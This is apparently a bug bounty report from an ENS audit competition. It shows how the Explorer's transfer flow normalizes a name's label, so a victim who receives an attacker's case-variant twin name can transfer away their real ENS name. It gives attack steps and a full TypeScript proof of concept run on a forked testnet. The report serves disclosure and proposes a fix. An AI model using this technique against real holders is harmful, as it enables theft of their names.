# 91717 w a critical explorer transfer flow moves a different ens name than the ui and wallet prompt display because on chain identity is derived from the normalized label

**Submitted on Sep 3rd 2026 at 20:20:24 UTC by @Dead\_Aizen for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91717
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

`PermissionedRegistry` keys every entry by `LibLabel.id(label) = keccak256(bytes(label))` and performs no normalization or charset validation; neither does `ETHRegistrar.register`. `Foo.eth` and `foo.eth` are therefore two distinct names with two distinct token ids.

The Explorer's transfer flow displays the **raw** name — in the page, the names list, and the wallet transaction description — but derives the **token it transfers** by first passing that name through `ens_normalize`. When a registered label is not normalized, the transaction the user approves moves a different name than the one shown.

Demonstrated on-chain against the contracts the shipped app uses, with no privileged role at any step.

**Asset:** `apps/portal` (Explorer) **Revision:** `63772fd872af472ced58b009499355f3430c2a86` (program-stated audited revision; squashed as `cda79ac` in the Immunefi fork) **Severity:** Critical — *"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user … submits a transaction … showing the wrong recipient or amount on a transaction the user then approves"*

## Root cause

`apps/portal/src/features/transfer/hooks/useTransferName.ts`

```ts
getEnsTokenId({ label: getLabel(name), registryAddress })   // L113 — token that is transferred
const label = getLabel(name)                                // L132 — detach steps
transactionName: `${STEP_LABELS[step]} - ${name}`           // L177 — what the user is shown
```

`getLabel()` (`src/utils/token/getLabel.ts`) runs `ens_normalize`, which throws on invalid labels but silently folds case and certain Unicode. Those silent transforms are the dangerous input.

`useCanTransferName` uses `getLabel(name)` too, so the permission check passes on the **twin's** roles. That check exists specifically to prevent this outcome — `routes/$name/ownership/transfer.tsx` states it guards against *"walking the user into a partial, unrecoverable failure"*, because the flow runs irreversible detach steps before the token moves. It is what green-lights the wrong-asset transfer.

The route's ownership guard uses the **raw** name (`isAddressEqual(address, data.owner)`; ensjs `getOwner` DNS-encodes without normalizing), so the page correctly establishes ownership of the displayed name. Only the execution path diverges.

## No privileged role is required

| Step            | Function                                | Access control                                                                                                                     |
| --------------- | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Fund attacker   | `MockERC20.mint`                        | none — public faucet helper on the Sepolia test USDC                                                                               |
| Reserve label   | `ETHRegistrar.commit`                   | none — `external`                                                                                                                  |
| Register twin   | `ETHRegistrar.register`                 | none — `external`; needs a commitment, availability, ERC-20 payment                                                                |
| Transfer rights | `REGISTRATION_ROLE_BITMAP`              | granted to every registrant; includes `ROLE_CAN_TRANSFER_ADMIN`                                                                    |
| Push to victim  | `PermissionedRegistry.safeTransferFrom` | `_update` checks `ROLE_CAN_TRANSFER_ADMIN` on `from` **only** — no recipient restriction; an EOA receives ERC-1155 without consent |

## Attack

1. Attacker registers `Foo.eth`, the unnormalized twin of a victim's `foo.eth`. Both apps' own forms reject unnormalized labels; the contracts do not.
2. Attacker `safeTransferFrom`s it to the victim, unsolicited.
3. The victim sees an unfamiliar `Foo.eth` in their names list — the indexer serves `name` raw and `useV2NamesWithRolesForAddress` passes it through unfiltered.
4. The victim transfers it away.
5. The app resolves the token id for label `foo`; the victim's real `foo.eth` moves to the recipient. Irreversible.

The flow fails closed when the victim does **not** own the twin: `useCanTransferName` finds no role on `foo` and the UI refuses. The bug fires only in the harmful configuration.

## Proof of concept

A vitest test in `apps/portal`. It imports the app's own `getLabel` and the same `getTokenId` from `@ensdomains/ensjs/public/v2` that the app's `getEnsTokenId` wrapper calls; commitments are computed by the registrar's own `makeCommitment`. Nothing is re-implemented or stubbed.

```bash
anvil --fork-url <SEPOLIA_RPC> --chain-id 11155111 --port 8545
pnpm vitest run src/poc-label-divergence.test.ts     # from apps/portal
```

Contracts are those the shipped app resolves through ensjs (`ensL1Contracts[sepolia]`): registry `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`, registrar `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, payment token `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`.

The three accounts are ordinary EOAs; anvil impersonation stands in for those users signing, and the only cheatcodes are `setBalance` (gas) and `increaseTime` (skip the commitment wait).

Result:

```
 ✓ src/poc-label-divergence.test.ts (1 test) 34443ms
   ✓ transfers a different name than the UI and wallet prompt display

displayed  : ZQXpoc9911.eth -> 0xb0b0000000000000000000000000000000000002 (unchanged)
transferred: zqxpoc9911.eth -> 0xdead000000000000000000000000000000000003
```

The final `safeTransferFrom` is issued directly rather than through the app's `transferToken()` helper, which requires a wagmi wallet client and the transaction-manager runtime. That helper makes the identical call — `safeTransferFrom(from, recipient, tokenId, 1n, '0x')` with the token id from `getEnsTokenId` — so the transaction sent here is byte-equivalent to the one the app sends.

## Other affected sites

The same root cause appears in `routes/$name/subnames.tsx` (`deleteSubname` burns the normalized twin) and in `apps/manager`'s `NamesTable.tsx` (`toBulkRenewName` renews the normalized twin, and `selectionKey` lowercases so case-variant names collide into one checkbox).

`ConfigureRegistryForm` → `setSubregistry` derives its label as `name.split('.')[0]` — raw, consistent with its display — which shows this is an inconsistency rather than a convention. `toBulkRenewName` even documents the hazard (*"the display name may be unnormalized (e.g. mixed case) and would hash to the wrong label"*) and then resolves it the wrong way round.

## Relation to known issues

**EXP-INPUT-005** concerns input validators accepting homoglyph/bidi characters and caps its impact at *"homograph-style display confusion in our UI rather than incorrect resolution."* Here the validators are correct — both apps reject unnormalized input. The defect is downstream: the name arrives already registered, resolution is correct, and the transaction acts on a different name.

**QA-01 / WEB-1257 / WEB-1305** describe transfer-related errors and inability. This is a successful transaction against the wrong asset, which the known-issues document keeps in scope as *"a demonstrated security consequence … rather than merely erroring."*

## Limitations

1. No naturally-occurring unnormalized name was observed on the app's indexer (1,000-domain sample from `staging-graphql.ens.dev`, none where `name !== normalizedName`). The attacker creates the condition; the PoC shows that is permissionless and costs one registration fee.
2. Requires the victim to initiate the transfer of the received name.
3. Demonstrated on a Sepolia fork, driving the app's derivation directly rather than through the browser.

## Fix

Derive on-chain identity from the label **as registered**, never from a re-normalized form — `name.split('.')[0]`, as `setSubregistry` already does — anywhere the result feeds a labelhash, token id, or resource. Alternatively key writes off the `tokenId`/`labelName` the indexer returns for the displayed name, so display and execution cannot diverge. Apply the same correction to the subname delete path and to Manager's bulk renew, including `selectionKey`.

## Proof of Concept

```ts
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import { createPublicClient, createWalletClient, http, keccak256, toBytes,
         zeroAddress, zeroHash, type Address } from 'viem'
import { sepolia } from 'viem/chains'
import { expect, it } from 'vitest'
import { getLabel } from '@/utils/token/getLabel'          // the app's own function

const RPC = 'http://127.0.0.1:8545'
const REGISTRY  = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as Address
const REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc' as Address
const USDC      = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39' as Address
const ATTACKER  = '0xa11ce00000000000000000000000000000000001' as Address
const VICTIM    = '0xb0b0000000000000000000000000000000000002' as Address
const THIRD     = '0xdead000000000000000000000000000000000003' as Address
const RAW = 'ZQXpoc9911'
const DISPLAYED = `${RAW}.eth`
const DURATION = 31536000n

const regAbi = [
  { name:'ownerOf', type:'function', stateMutability:'view',
    inputs:[{name:'i',type:'uint256'}], outputs:[{type:'address'}] },
  { name:'safeTransferFrom', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'from',type:'address'},{name:'to',type:'address'},{name:'id',type:'uint256'},
            {name:'amount',type:'uint256'},{name:'data',type:'bytes'}], outputs:[] },
] as const
const rarAbi = [
  { name:'commit', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'c',type:'bytes32'}], outputs:[] },
  { name:'register', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'label',type:'string'},{name:'owner',type:'address'},{name:'secret',type:'bytes32'},
            {name:'subregistry',type:'address'},{name:'resolver',type:'address'},{name:'duration',type:'uint64'},
            {name:'paymentToken',type:'address'},{name:'referrer',type:'bytes32'}], outputs:[{type:'uint256'}] },
  { name:'MIN_COMMITMENT_AGE', type:'function', stateMutability:'view',
    inputs:[], outputs:[{type:'uint64'}] },
  { name:'makeCommitment', type:'function', stateMutability:'pure',
    inputs:[{name:'label',type:'string'},{name:'owner',type:'address'},{name:'secret',type:'bytes32'},
            {name:'subregistry',type:'address'},{name:'resolver',type:'address'},{name:'duration',type:'uint64'},
            {name:'referrer',type:'bytes32'}], outputs:[{type:'bytes32'}] },
] as const
const tokAbi = [
  { name:'mint', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'to',type:'address'},{name:'amt',type:'uint256'}], outputs:[] },
  { name:'approve', type:'function', stateMutability:'nonpayable',
    inputs:[{name:'s',type:'address'},{name:'a',type:'uint256'}], outputs:[{type:'bool'}] },
] as const

const pub = createPublicClient({ chain: sepolia, transport: http(RPC) })
const wal = (a: Address) => createWalletClient({ account: a, chain: sepolia, transport: http(RPC) })
const rpc = (m: string, p: unknown[]) => fetch(RPC, {
  method:'POST', headers:{'content-type':'application/json'},
  body: JSON.stringify({ jsonrpc:'2.0', id:1, method:m, params:p }),
}).then(r => r.json())

const ownerOf = async (id: bigint) => {
  const a = await pub.readContract({
    address: REGISTRY, abi: regAbi, functionName: 'ownerOf', args: [id],
  }) as Address
  return a.toLowerCase() as Address       // EIP-55 checksummed on return
}
const sent = async (hash: `0x${string}`, what: string) => {
  const r = await pub.waitForTransactionReceipt({ hash })
  expect(r.status, what).toBe('success')
}

async function registerName(label: string, owner: Address, minAge: bigint) {
  const w = wal(owner)
  await sent(await w.writeContract({ address:USDC, abi:tokAbi, functionName:'mint',
    args:[owner, 10n ** 12n] }), `mint ${label}`)
  await sent(await w.writeContract({ address:USDC, abi:tokAbi, functionName:'approve',
    args:[REGISTRAR, 10n ** 12n] }), `approve ${label}`)
  const secret = keccak256(toBytes(`${label}:poc`))
  const commitment = await pub.readContract({
    address: REGISTRAR, abi: rarAbi, functionName: 'makeCommitment',
    args: [label, owner, secret, zeroAddress, zeroAddress, DURATION, zeroHash],
  }) as `0x${string}`                     // computed by the registrar itself
  await sent(await w.writeContract({ address:REGISTRAR, abi:rarAbi, functionName:'commit',
    args:[commitment] }), `commit ${label}`)
  await rpc('evm_increaseTime', [Number(minAge) + 30])
  await rpc('evm_mine', [])
  await sent(await w.writeContract({ address:REGISTRAR, abi:rarAbi, functionName:'register',
    args:[label, owner, secret, zeroAddress, zeroAddress, DURATION, USDC, zeroHash] }),
    `register ${label}`)
}

it('transfers a different name than the UI and wallet prompt display', async () => {
  const normalized = getLabel(DISPLAYED)          // app's own function -> 'zqxpoc9911'
  expect(normalized).not.toBe(RAW)

  for (const a of [ATTACKER, VICTIM, THIRD]) {
    await rpc('anvil_impersonateAccount', [a])
    await rpc('anvil_setBalance', [a, '0x21e19e0c9bab2400000'])
  }
  const minAge = await pub.readContract({
    address: REGISTRAR, abi: rarAbi, functionName: 'MIN_COMMITMENT_AGE' }) as bigint

  await registerName(normalized, VICTIM, minAge)  // victim's real name
  await registerName(RAW, ATTACKER, minAge)       // attacker's unnormalized twin

  const idRaw  = await getTokenId(pub as never, { label: RAW,        registryAddress: REGISTRY })
  const idNorm = await getTokenId(pub as never, { label: normalized, registryAddress: REGISTRY })

  // attacker pushes the twin to the victim; _update restricts `from` only
  await sent(await wal(ATTACKER).writeContract({ address:REGISTRY, abi:regAbi,
    functionName:'safeTransferFrom', args:[ATTACKER, VICTIM, idRaw, 1n, '0x'] }), 'airdrop')

  expect(await ownerOf(idRaw)).toBe(VICTIM)
  expect(await ownerOf(idNorm)).toBe(VICTIM)

  // the app's derivation — useTransferName.ts L113
  const target = await getTokenId(pub as never, {
    label: getLabel(DISPLAYED), registryAddress: REGISTRY })

  expect(target).not.toBe(idRaw)                  // not the name being displayed
  expect(target).toBe(idNorm)                     // the normalized twin

  // the transaction the user approves is described as `Transfer name - ${DISPLAYED}`
  await sent(await wal(VICTIM).writeContract({ address:REGISTRY, abi:regAbi,
    functionName:'safeTransferFrom', args:[VICTIM, THIRD, target, 1n, '0x'] }),
    `transfer "${DISPLAYED}"`)

  expect(await ownerOf(idRaw)).toBe(VICTIM)       // name shown in the UI: unchanged
  expect(await ownerOf(idNorm)).toBe(THIRD)       // victim's real name: transferred away

  console.info('displayed  :', DISPLAYED, '->', await ownerOf(idRaw), '(unchanged)')
  console.info('transferred:', `${normalized}.eth`, '->', await ownerOf(idNorm))
}, 120_000)
```
